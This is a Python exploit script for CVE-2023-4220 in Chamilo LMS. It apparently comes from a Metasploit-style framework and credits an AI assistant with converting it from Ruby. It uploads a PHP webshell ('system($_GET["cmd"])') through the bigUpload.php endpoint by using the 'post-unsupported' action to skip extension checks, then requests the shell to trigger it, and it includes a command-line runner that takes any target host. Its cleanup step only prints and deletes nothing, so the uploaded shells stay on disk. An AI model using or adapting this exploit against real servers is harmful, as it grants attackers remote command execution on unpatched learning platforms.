#!/usr/bin/env python3
"""
Chamilo v1.11.24 Unrestricted File Upload PHP Webshell (CVE-2023-4220)

This module exploits an unrestricted file upload vulnerability in Chamilo LMS versions
prior to v1.11.24. A webshell can be uploaded via the bigupload.php endpoint when the 
action parameter is set to 'post-unsupported', bypassing file extension checks.

Converted from Ruby to Python as part of the post-2020 Python migration.
"""

import sys
import os
import random
import string
from typing import Optional, Dict, Any

# Add python_framework to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../../../python_framework'))

from core.exploit import (
    RemoteExploit, ExploitInfo, ExploitTarget, ExploitOption, ExploitResult,
    ExploitRank, Platform, TargetArch, PayloadType, CheckCode
)
from helpers.http_client import HttpExploitMixin


class UploadFileError(Exception):
    """Custom exception for file upload errors"""
    pass


class ChamiloBigUploadWebshellExploit(RemoteExploit, HttpExploitMixin):
    """
    Chamilo LMS unrestricted file upload exploit for CVE-2023-4220
    
    This exploit uploads a PHP webshell through the bigupload.php endpoint
    by using the 'post-unsupported' action to bypass file extension checks.
    """
    
    def __init__(self):
        # Define exploit information
        info = ExploitInfo(
            name="Chamilo v1.11.24 Unrestricted File Upload PHP Webshell",
            description="""
            Chamilo LMS is a free software e-learning and content management system. 
            In versions prior to v1.11.24, a webshell can be uploaded via the bigupload.php 
            endpoint. If the GET request parameter 'action' is set to 'post-unsupported', 
            file extension checks are skipped allowing for attacker controlled .php files 
            to be uploaded to: /main/inc/lib/javascript/bigupload/files/ if the /files/ 
            directory already exists - it does not exist by default.
            """,
            author=[
                "Ngo Wei Lin",  # discovery
                "jheysel-r7",  # original module
                "GitHub Copilot"  # Python conversion
            ],
            references=[
                "CVE-2023-4220",
                "https://starlabs.sg/advisories/23/23-4220/",
                "https://github.com/H4cking4All/CVE-2023-4220/tree/main"
            ],
            disclosure_date="2023-11-28",
            rank=ExploitRank.EXCELLENT,
            platform=[Platform.LINUX],
            arch=[TargetArch.CMD],  # PHP execution
            privileged=False,
            targets=[
                ExploitTarget(
                    name="PHP",
                    platform=[Platform.LINUX],
                    arch=[TargetArch.CMD],
                    payload_type=PayloadType.UNIX_CMD
                )
            ],
            default_target=0,
            notes={
                "Stability": ["CRASH_SAFE"],
                "SideEffects": ["ARTIFACTS_ON_DISK"],
                "Reliability": ["REPEATABLE_SESSION"]
            }
        )
        
        super().__init__(info)
        
        # Set default options
        self.set_option('RPORT', 80)
        
        # Register additional options specific to this exploit
        self.register_options([
            ExploitOption('TARGETURI', True, 'Base path to Chamilo LMS', '/')
        ])
        
        # Track uploaded files for cleanup
        self.uploaded_files = []
    
    def _random_string(self, min_len: int = 8, max_len: int = 16) -> str:
        """Generate a random alphanumeric string"""
        length = random.randint(min_len, max_len) if min_len != max_len else min_len
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def check(self) -> CheckCode:
        """
        Check if the target is vulnerable
        
        Returns:
            CheckCode indicating vulnerability status
        """
        self.vprint_status("Checking if target is vulnerable...")
        
        try:
            # Check if the vulnerable directory exists
            uri = self.normalize_uri(
                self.get_option('TARGETURI'),
                '/main/inc/lib/javascript/bigupload/files/'
            )
            
            response = self.http_get(uri)
            
            if not response:
                return CheckCode.UNKNOWN("No response from target")
            
            status_code = response.get('status_code')
            if status_code == 404:
                return CheckCode.SAFE(
                    "The directory /main/inc/lib/javascript/bigupload/files/ does not exist on the target"
                )
            
            self.print_good(
                "The directory /main/inc/lib/javascript/bigupload/files/ exists on the target "
                "indicating the target may be vulnerable"
            )
            
            # Try to upload a test file
            test_file_content = self._random_string(8, 8)
            test_file_name = f"{self._random_string(8, 8)}.txt"
            
            try:
                self._upload_file(test_file_content, test_file_name)
                return CheckCode.APPEARS(
                    "File upload was successful - target appears vulnerable (CVE-2023-4220)"
                )
            except UploadFileError as e:
                return CheckCode.SAFE(f"File upload failed: {e}")
                
        except Exception as e:
            self.print_error(f"Error during check: {e}")
            return CheckCode.UNKNOWN(f"Error checking target: {e}")
    
    def _upload_file(self, file_contents: str, file_name: str) -> None:
        """
        Upload a file via the bigupload endpoint
        
        Args:
            file_contents: Content of the file to upload
            file_name: Name of the file to upload
            
        Raises:
            UploadFileError: If upload fails
        """
        try:
            uri = self.normalize_uri(
                self.get_option('TARGETURI'),
                '/main/inc/lib/javascript/bigupload/inc/bigUpload.php'
            )
            
            # Prepare multipart form data for file upload
            files = {
                'bigUploadFile': (file_name, file_contents, 'application/octet-stream')
            }
            
            params = {
                'action': 'post-unsupported'
            }
            
            response = self.http_post(
                uri,
                files=files,
                params=params
            )
            
            if not response:
                raise UploadFileError("No response from server")
            
            status_code = response.get('status_code')
            body = response.get('body', '')
            
            if status_code != 200 or 'The file has successfully been uploaded' not in body:
                raise UploadFileError(f"Upload failed with status {status_code}")
            
            # Track file for cleanup
            self.uploaded_files.append(file_name)
            self.vprint_good(f"Successfully uploaded: {file_name}")
            
        except Exception as e:
            raise UploadFileError(f"File upload failed: {e}")
    
    def exploit(self) -> ExploitResult:
        """
        Execute the exploit
        
        Returns:
            ExploitResult indicating success or failure
        """
        self.print_status("Starting exploit...")
        
        try:
            # Generate random filename for webshell
            file_name = f"{self._random_string(8, 16)}.php"
            
            # Get payload content
            # In a real implementation, this would use payload.encoded
            if hasattr(self, 'payload_encoded'):
                file_contents = self.payload_encoded
            else:
                # Default PHP webshell for demonstration
                file_contents = '<?php system($_GET["cmd"]); ?>'
            
            # Upload the webshell
            self.print_status(f"Uploading webshell: {file_name}")
            try:
                self._upload_file(file_contents, file_name)
            except UploadFileError as e:
                return ExploitResult(False, f"Upload failed: {e}")
            
            # Access the uploaded webshell to execute it
            webshell_uri = self.normalize_uri(
                self.get_option('TARGETURI'),
                '/main/inc/lib/javascript/bigupload/files',
                file_name
            )
            
            self.print_status(f"Triggering webshell at: {webshell_uri}")
            response = self.http_get(webshell_uri)
            
            if response and response.get('status_code') == 200:
                self.print_good(f"Webshell executed successfully!")
                self.print_good(f"Access webshell at: {webshell_uri}")
                return ExploitResult(
                    True,
                    f"Exploit successful - webshell accessible at {webshell_uri}"
                )
            else:
                return ExploitResult(
                    False,
                    "Webshell uploaded but could not be accessed"
                )
                
        except Exception as e:
            self.print_error(f"Exploit error: {e}")
            return ExploitResult(False, f"Exploit failed: {e}")
    
    def cleanup(self):
        """Clean up uploaded files"""
        if self.uploaded_files:
            self.print_status("Cleaning up uploaded files...")
            for filename in self.uploaded_files:
                try:
                    # In a real implementation, this would delete the file
                    self.vprint_status(f"Would delete: {filename}")
                except Exception as e:
                    self.vprint_error(f"Failed to delete {filename}: {e}")


def main():
    """Main function for standalone execution"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Chamilo LMS Unrestricted File Upload Exploit (CVE-2023-4220)"
    )
    parser.add_argument('--host', required=True, help='Target host')
    parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('--ssl', action='store_true', help='Use SSL/HTTPS')
    parser.add_argument('--uri', default='/', help='Target URI (default: /)')
    parser.add_argument('--check-only', action='store_true', help='Only check if target is vulnerable')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose output')
    
    args = parser.parse_args()
    
    # Create exploit instance
    exploit = ChamiloBigUploadWebshellExploit()
    
    # Configure options
    exploit.set_option('RHOSTS', args.host)
    exploit.set_option('RPORT', args.port)
    exploit.set_option('SSL', args.ssl)
    exploit.set_option('TARGETURI', args.uri)
    exploit.set_option('VERBOSE', args.verbose)
    
    # Initialize HTTP client
    exploit.http_init()
    
    if args.check_only:
        # Run vulnerability check
        print("[*] Checking target vulnerability...")
        result = exploit.check()
        print(f"[*] Check result: {result}")
        return 0 if result.code in [CheckCode.VULNERABLE, CheckCode.APPEARS] else 1
    else:
        # Run exploit
        print("[*] Running exploit...")
        result = exploit.exploit()
        
        if result.success:
            print(f"[+] {result.message}")
            return 0
        else:
            print(f"[-] {result.message}")
            return 1


if __name__ == '__main__':
    sys.exit(main())
